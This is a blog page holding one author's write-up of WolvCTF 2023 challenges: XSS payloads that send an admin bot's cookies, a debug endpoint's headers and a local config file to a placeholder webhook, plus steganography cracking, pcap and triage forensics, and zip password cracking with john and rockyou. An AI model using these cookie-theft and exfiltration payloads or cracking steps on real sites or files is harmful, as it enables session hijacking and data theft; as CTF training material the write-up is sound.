@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>WolvCTF 2023 - Writeup // chrootcommit</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.111.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="chrootcommit" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1fe426fd82899b3823133b4b6fadb0e1f0d8332eecc710a4dfe43101ac5895e0.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WolvCTF 2023 - Writeup"/>
+<meta name="twitter:description" content="Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&rsquo;s admin. (admin is a bot who visits the url you give).
+Payload : &lt;script&gt;window.location=&#34;https://&lt;myWebHook&gt;/?c=&#34;.concat(document.cookie)&lt;/script&gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&rsquo;t gather the cookie throught the document object."/>
+
+    <meta property="og:title" content="WolvCTF 2023 - Writeup" />
+<meta property="og:description" content="Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&rsquo;s admin. (admin is a bot who visits the url you give).
+Payload : &lt;script&gt;window.location=&#34;https://&lt;myWebHook&gt;/?c=&#34;.concat(document.cookie)&lt;/script&gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&rsquo;t gather the cookie throught the document object." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://test.com/posts/2023-03-20-wolvctf2023/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-20T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://test.com/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
+      <span class="app-header-title">chrootcommit</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/about">About</a>
+            -
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Junior Cybersecurity Consultant.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">WolvCTF 2023 - Writeup</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 20, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><img src="/wolvctf/Overview.png" alt=""></p>
+<h1 id="challenges-solved-">Challenges Solved :</h1>
+<p><img src="/wolvctf/Challenges.png" alt=""></p>
+<h1 id="web">Web</h1>
+<h2 id="zombie101">ZOmbie 101</h2>
+<p>This Challenge is a a classic xss where you steal the cookie&rsquo;s admin. (admin is a bot who visits the url you give).</p>
+<p><img src="/wolvctf/Zombie101_Overview.png" alt=""></p>
+<pre tabindex="0"><code>Payload : &lt;script&gt;window.location=&#34;https://&lt;myWebHook&gt;/?c=&#34;.concat(document.cookie)&lt;/script&gt;
+</code></pre><p>I sent the url with payload to the admin input and got the flag : <code>wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} </code></p>
+<h2 id="zombie201">Zombie 201</h2>
+<p>It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&rsquo;t gather the cookie throught the document object.
+However, debug is activated allowing to perform request to /debug endpoint.</p>
+<p>/debug&rsquo;s source code :</p>
+<pre tabindex="0"><code>// useful for debugging cloud deployments
+app.get(&#39;/debug&#39;, function(req, res) {
+    if (config.allowDebug) {
+        res.send({&#34;remote-ip&#34;: req.socket.remoteAddress, ...req.headers})
+    }
+    else {
+        res.send(&#39;sorry, debug endpoint is not enabled&#39;)
+    }
+})
+</code></pre><p>I thought I could exploit xss throught this endpoint :</p>
+<pre tabindex="0"><code>payload : 
+&lt;script&gt;
+fetch(&#34;https://zombie-201-tlejfksioa-ul.a.run.app/debug&#34;)
+  .then((response) =&gt; response.json())
+  .then((data) =&gt; fetch(&#34;https://&lt;MyHook&gt;/?/=&#34;.concat(JSON.stringify(data)), { credentials: &#39;include&#39; }));
+&lt;/script&gt;
+</code></pre><p>Flag : <code>wctf{h1dd3n-c00k135-d1d-n07-h31p-373964} </code></p>
+<h2 id="zombie301">Zombie 301</h2>
+<p>In this challenge, httponly is still enabled, but debug is disabled. We can steal the admin cookie in HTTP headers by performing an HTTP request inside the website and resending the HTTP response to our webhook.</p>
+<pre tabindex="0"><code>payload :  
+&lt;script&gt;
+fetch(&#34;https://zombie-301-tlejfksioa-ul.a.run.app/&#34;)
+  .then((data) =&gt; fetch(&#34;https://&lt;myHook&gt;/?/=&#34;.concat(JSON.stringify(data)), { credentials: &#39;include&#39; }));
+&lt;/script&gt;
+</code></pre><p>Flag : <code>wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831}</code></p>
+<h2 id="zombie401">Zombie 401</h2>
+<p>This time, httonly is disabled and debug is enabled, but the flag is in a file (config.json) hosted by the server. Our goal is to exfiltrate the file content to get the flag throught XSS. I used the &ldquo;file ://&rdquo; URI to exfiltrate the flag :</p>
+<pre tabindex="0"><code>&lt;script&gt;
+fetch(&#39;file:///ctf/app/config.json&#39;)
+  .then(response =&gt; response.text())
+  .then(data =&gt;  window.location=&#34;https://&lt;MyHook&gt;/?/=&#34;.concat(data))
+  .catch(error =&gt; window.location=&#34;https://&lt;MyHook&gt;/?/=&#34;.concat(error));
+&lt;/script&gt;
+</code></pre><p>flag : <code> wctf{y0u-4r3-4n-4dm1n-807-m4573r-86835} Zombie 401</code></p>
+<h1 id="forensic">Forensic</h1>
+<h2 id="dinotraiding">Dino Trading</h2>
+<p>We open the pcap of this challenge with wireshark:
+<img src="/wolvctf/Dino_trading.png" alt=""></p>
+<p>We can see ftp traffics, especially raw data throught FTP (FTP-Data protocol). let&rsquo;s see ftp commands :
+<img src="/wolvctf/Dino_Trading_FTP_Com.png" alt=""></p>
+<p>The client attempted to list directory, here is the result returned by ftp server :</p>
+<p><img src="/wolvctf/Dino_Trading_FTP_LIST.png" alt=""></p>
+<p>As you can see, there is an image epicfight.jpg.
+With RETR, the client downloads the epicfight.jpg image, We can see the image data in our pcap, we just had to save the image turning the data type into raw :</p>
+<!-- raw HTML omitted -->
+<p>Downloaded image :</p>
+<!-- raw HTML omitted -->
+<p>Now, how to find the flag? It is an image, the first thing I thought was to attempt to extract some hidden data thanks to steghide, it asked me to enter a passphrase. Then, I used stegseek to crack the passphrase :</p>
+<pre tabindex="0"><code>stegseek epicFight.jpg /usr/share/wordlists/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &#34;&#34;
+[i] Original filename: &#34;hidden.txt&#34;.
+[i] Extracting to &#34;epicFight.jpg.out&#34;.
+
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ cat epicFight.jpg.out 
+d2N0Znthbl8xbWFnZV9pbl9hX3BlZWNhcF9iNjR9
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ cat epicFight.jpg.out | base64 -d
+wctf{an_1mage_in_a_peecap_b64}     
+</code></pre><h2 id="compromised">Employee 427: Compromised</h2>
+<h3 id="description">Description</h3>
+<p>This is the story of Employee 427</p>
+<p>Employee 427 works all day, every day. This is because Employee 427 loves his job</p>
+<p>Then one day, something strange happens</p>
+<p>Something Employee 427 would never forget</p>
+<p>The profits diagram that Employee 427 had put months together suddenly disappeared</p>
+<p>Employee 427 was shocked, what could have happened? He thought to himself</p>
+<p>Unsure what to do, Employee 427 has reached out to you, yes you, to figure out how his precious diagram could have vanished</p>
+<h3 id="performing-forensic-on-triage">Performing Forensic on triage</h3>
+<p>For this, challenge I used autopsy to analyze my triage . I found an interesting file	<code>ConsoleHost_history.txt</code> :
+<img src="/wolvctf/Employee427_compromised_history.png" alt="">
+It seems profit.jpg was removed and I found a pastebin link, I convert it into URL : <a href="https://pastebin.com/75Muuu8m">https://pastebin.com/75Muuu8m</a>
+After getting into the pastebin link, I got the flag :</p>
+<pre tabindex="0"><code>wctf{p3rh4ps_h3_h4D_s1MpLy_m1553D_4_mEm0}
+</code></pre><h2 id="locate">Employee 427: Locate</h2>
+<h3 id="description-1">Description</h3>
+<p>Employee 427 stood up, infuriated, by what has happened to his sensitive files</p>
+<p>As Employee 427 began pondering what to do, reality set in</p>
+<p>Employee 427 is in big trouble. Employee 427 has a meeting on Monday where the whole Finance department will be awaiting Employee 427&rsquo;s diagram they have been working for so, so long on</p>
+<p>Employee 427 thought &ldquo;If I do not figure out a way to recover this diagram, I am surely fired&rdquo;</p>
+<p>Employee 427 loved their job. Employee 427 does not want to be fired</p>
+<p>Employee 427 hopes that you will be able to locate the file that Employee 427 lost. Same triage as Employee 427: Compromised</p>
+<h3 id="performing-forensic-on-triage-1">Performing forensic on triage</h3>
+<p>The goal of this challenge is to find the original profits.jpg :</p>
+<p><img src="/wolvctf/Employee427_Locate_Redacted.png" alt=""></p>
+<p>I found interesting information on files donwloaded by Employee 427 :</p>
+<p><img src="/wolvctf/Employee427_Locate_Download.png" alt=""></p>
+<p>There is a github repo : <a href="http://github.com/awesomecorp3234243523/private-documents">http://github.com/awesomecorp3234243523/private-documents</a>
+Finally this repository contains the flag : <a href="https://github.com/awesomecorp3234243523/private-documents/blob/main/profits_old.jpg">https://github.com/awesomecorp3234243523/private-documents/blob/main/profits_old.jpg</a></p>
+<!-- raw HTML omitted -->
+<h1 id="beginner">Beginner</h1>
+<h2 id="charlotteweb">Charlotte&rsquo;s Web</h2>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ curl https://charlotte-tlejfksioa-ul.a.run.app/                                           
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;script&gt;
+  function start() {
+    alert(&#34;where&#39;s the flag? i swear it was around here somewhere&#34;);
+  }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;button onclick=&#39;start()&#39;&gt;click me for the flag&lt;/button&gt;
+&lt;!-- /src --&gt;
+&lt;/body&gt;
+&lt;/html&gt;                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ curl https://charlotte-tlejfksioa-ul.a.run.app/src
+
+import flask
+
+app = flask.Flask(__name__)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+  return flask.send_file(&#39;index.html&#39;)
+
+@app.route(&#39;/src&#39;, methods=[&#39;GET&#39;])
+def source():
+  return flask.send_file(&#39;app.py&#39;)
+
+@app.route(&#39;/super-secret-route-nobody-will-guess&#39;, methods=[&#39;PUT&#39;])
+def flag():
+  return open(&#39;flag&#39;).read()
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ curl https://charlotte-tlejfksioa-ul.a.run.app//super-secret-route-nobody-will-guess -X PUT
+wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}      
+</code></pre><h2 id="babyre">Baby re</h2>
+<pre tabindex="0"><code>strings baby-re | grep wctf
+wctf{Oh10_Stat3_1s_Smelly!}
+wctf{Must_be_fr0m_OSU}
+wctf{A_t0tally_fake_flag}
+                                             
+</code></pre><p>By guessing I took <code>wctf{Oh10_Stat3_1s_Smelly!} </code> and It was the right flag</p>
+<h2 id="rockyou">We will rock you</h2>
+<p>The challenge gave us a protected zip file. Then, we crack it with john and the rockyou wordlist :</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ zip2john we_will_rock_you.zip &gt; zip.hashes                 
+Created directory: /home/kali/.john
+ver 1.0 we_will_rock_you.zip/we_will_rock_you/ is not encrypted, or stored with non-handled compression type
+ver 1.0 efh 5455 efh 7875 we_will_rock_you.zip/we_will_rock_you/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=7D20D45F ts=B816 cs=b816 type=0
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hashes
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+michigan4ever    (we_will_rock_you.zip/we_will_rock_you/flag.txt)     
+1g 0:00:00:00 DONE (2023-03-20 17:35) 1.176g/s 6548Kp/s 6548Kc/s 6548KC/s mickovgys..michellsmg
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(kali㉿kali)-[~/CTF/WolvCTF]
+└─$ cat we_will_rock_you/flag.txt 
+wctf{m1cH1g4n_4_3v3R} 
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
